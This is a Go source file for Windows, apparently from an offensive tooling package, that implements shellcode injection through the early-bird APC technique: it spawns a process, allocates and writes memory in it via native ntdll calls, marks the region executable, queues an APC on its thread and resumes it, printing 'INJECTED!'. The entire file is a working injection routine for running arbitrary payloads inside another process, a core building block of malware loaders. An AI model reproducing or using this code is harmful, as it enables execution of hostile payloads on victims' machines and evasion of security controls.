// +build windows

package inject

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

func NtQueueUserAPC(shellcode []byte) {
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	ntAllocateVirtualMemory := ntdll.NewProc("NtAllocateVirtualMemory")
	ntProtectVirtualMemory := ntdll.NewProc("NtProtectVirtualMemory")
	ntWriteVirtualMemory := ntdll.NewProc("NtWriteVirtualMemory")
	ntAlertResumeThread := ntdll.NewProc("NtAlertResumeThread")
	ntQueueApcThread := ntdll.NewProc("NtQueueApcThread")

	pi := CreateProcess()
	oldProtect := windows.PAGE_READWRITE
	var lpBaseAddress uintptr
	size := len(shellcode)

	_, _, errNtAllocateVirtualMemory := ntAllocateVirtualMemory.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&lpBaseAddress)), 0, uintptr(unsafe.Pointer(&size)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errNtAllocateVirtualMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling NtAllocateVirtualMemory:\r\n%s", errNtAllocateVirtualMemory.Error()))
	}

	_, _, errNtWriteVirtualMemory := ntWriteVirtualMemory.Call(uintptr(pi.Process), lpBaseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(size), 0)
	if errNtWriteVirtualMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling NtWriteVirtualMemory:\r\n%s", errNtWriteVirtualMemory.Error()))
	}

	_, _, errNtProtectVirtualMemory := ntProtectVirtualMemory.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&lpBaseAddress)), uintptr(unsafe.Pointer(&size)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errNtProtectVirtualMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling NtProtectVirtualMemory:\r\n%s", errNtProtectVirtualMemory.Error()))
	}

	_, _, errNtQueueApcThread := ntQueueApcThread.Call(uintptr(pi.Thread), lpBaseAddress, lpBaseAddress, 0, 0)
	if errNtQueueApcThread.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling NtQueueApcThread:\r\n%s", errNtQueueApcThread.Error()))
	}

	_, _, errNtAlertResumeThread := ntAlertResumeThread.Call(uintptr(pi.Thread), 0)
	if errNtAlertResumeThread.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling NtAlertResumeThread:\r\n%s", errNtAlertResumeThread.Error()))
	}

	fmt.Println("INJECTED!")
}
